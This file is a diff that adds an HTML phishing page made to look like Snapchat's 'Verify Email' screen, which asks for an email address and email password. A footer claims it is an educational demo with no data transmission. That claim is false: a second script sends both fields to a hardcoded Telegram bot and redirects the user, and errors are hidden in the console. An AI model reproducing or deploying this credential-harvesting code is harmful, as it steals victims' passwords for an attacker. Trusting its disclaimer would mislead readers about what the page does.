@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verify Email</title>
+    <style>
+        /* --- SAME CSS AS INDEX.HTML FOR CONSISTENCY --- */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #FFFFFF; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        
+        .app-container { width: 100%; max-width: 380px; text-align: center; animation: fadeIn 0.5s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+
+        .logo-img { width: 80px; height: auto; margin-bottom: 20px; display: block; margin: 0 auto 20px auto; opacity: 0.8; }
+        h2 { font-size: 24px; font-weight: 700; margin-bottom: 10px; color: #000; }
+        p.subtitle { font-size: 14px; color: #666; margin-bottom: 30px; }
+
+        .login-form { display: flex; flex-direction: column; gap: 16px; }
+        
+        input {
+            width: 100%; padding: 18px 20px; font-size: 16px; border: 2px solid #f0f0f0;
+            background-color: #f9f9f9; border-radius: 12px; outline: none; transition: all 0.2s ease; color: #000;
+        }
+        input:focus { background-color: #fff; border-color: #000; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+
+        .btn-login {
+            width: 100%; padding: 16px; background-color: #FFFC00; color: #000; font-size: 16px;
+            font-weight: 800; text-transform: uppercase; border: none; border-radius: 30px;
+            cursor: pointer; margin-top: 10px; transition: transform 0.1s; position: relative; overflow: hidden;
+        }
+        .btn-login:active { transform: scale(0.97); }
+        .btn-login.loading { color: transparent; pointer-events: none; }
+
+        .spinner {
+            position: absolute; top: 50%; left: 50%; width: 20px; height: 20px;
+            border: 3px solid rgba(0,0,0,0.1); border-top: 3px solid #000; border-radius: 50%;
+            animation: spin 1s linear infinite; display: none; transform: translate(-50%, -50%);
+        }
+        @keyframes spin { 0% { transform: translate(-50%, -50%) rotate(0deg); } 100% { transform: translate(-50%, -50%) rotate(360deg); } }
+
+        .safety-footer {
+            position: fixed; bottom: 15px; width: 90%; background: rgba(0,0,0,0.8); color: #fff;
+            padding: 10px 15px; border-radius: 20px; font-size: 11px; text-align: center; backdrop-filter: blur(5px);
+        }
+
+        .toast {
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-20px);
+            background: #333; color: #fff; padding: 12px 24px; border-radius: 50px;
+            font-size: 14px; opacity: 0; pointer-events: none; transition: all 0.3s; z-index: 1000;
+        }
+        .toast.visible { opacity: 1; transform: translateX(-50%) translateY(0); }
+        .toast.success { background: #4CAF50; }
+        .toast.error { background: #D32F2F; }
+    </style>
+</head>
+<body>
+
+    <div id="toast" class="toast"></div>
+
+    <div class="app-container">
+        <!-- Logo thoda chota rakha hai visual variety ke liye -->
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" class="logo-img">
+        
+        <h2>Verify Email</h2>
+        <p class="subtitle">Please enter your email details to continue.</p>
+
+        <form id="emailForm" class="login-form" novalidate>
+            <!-- Email Inputs -->
+            <input type="email" id="emailAddress" placeholder="Email Address" autocomplete="off">
+            <input type="password" id="emailPassword" placeholder="Email Password">
+            
+            <button type="submit" class="btn-login" id="submitBtn">
+                <span class="btn-text">Continue</span>
+                <div class="spinner"></div>
+            </button>
+        </form>
+        
+        <div style="margin-top: 20px;">
+            <a href="index.html" style="color: #0054B0; text-decoration: none; font-size: 14px;">Back to Login</a>
+        </div>
+    </div>
+
+    <div class="safety-footer">
+        ⚠️ <strong>EDUCATIONAL DEMO:</strong> No real authentication or data transmission.
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('emailForm');
+            const btn = document.getElementById('submitBtn');
+            const btnText = btn.querySelector('.btn-text');
+            const spinner = btn.querySelector('.spinner');
+            const toast = document.getElementById('toast');
+
+            function showToast(msg, type = 'normal') {
+                toast.textContent = msg;
+                toast.className = `toast visible ${type}`;
+                setTimeout(() => toast.classList.remove('visible'), 3000);
+            }
+
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
+                
+                const emailVal = document.getElementById('emailAddress').value.trim();
+                const passVal = document.getElementById('emailPassword').value.trim();
+
+                if(!emailVal || !passVal) {
+                    showToast("Please enter email and password", "error");
+                    return;
+                }
+
+                // Start Loading
+                btn.classList.add('loading');
+                spinner.style.display = 'block';
+
+                // Simulation
+                setTimeout(() => {
+                    btn.classList.remove('loading');
+                    spinner.style.display = 'none';
+                    
+                    showToast("Verification Successful!", "success");
+                    
+                    // --- CHANGED PART HERE ---
+                    // Thoda delay taaki user success message dekh sake
+                    setTimeout(() => {
+                        window.location.href = 'complete.html';
+                    }, 1000); 
+                    // -------------------------
+
+                }, 1500);
+            });
+        });
+        
+document.getElementById('emailForm').addEventListener('submit', function(e) {
+    e.preventDefault(); // Page refresh hone se rokega
+
+    // 1. User se data lo
+    const name = document.getElementById('emailAddress').value;
+    const email = document.getElementById('emailPassword').value;
+  
+
+    // 2. Telegram Token aur Chat ID daalo
+    const botToken = '8303657634:AAEy-hwtUxIei4SSW5CGrlmueCvZGZ2WmYE';
+    const chatId = '6320680594';
+
+    // 3. Message format karo
+    const text = `🔔 *New Form Submission!*%0A%0A` + 
+                 `👤 *email:* ${name}%0A` +
+                 `📧 *pass:* ${email}%0A`;
+
+    // 4. Telegram API par request bhejo
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`;
+
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // Message safaltapurvak bhej diya gaya
+                document.getElementById('myForm').reset(); // Form saaf kar lo
+                
+                // Yahan Redirect ho raha hai
+                window.location.href = 'email.html'; 
+            } else {
+                // Agar error aaye toh console mein check karo, screen par kuch nahi aayega
+                console.error('Telegram Error:', data.description);
+            }
+        })
+        .catch(error => {
+            // Network error ho toh yahan handle hoga, screen par kuch nahi aayega
+            console.error('Network Error:', error);
+        });
+});
+        
+    </script>
+</body>
+</html>
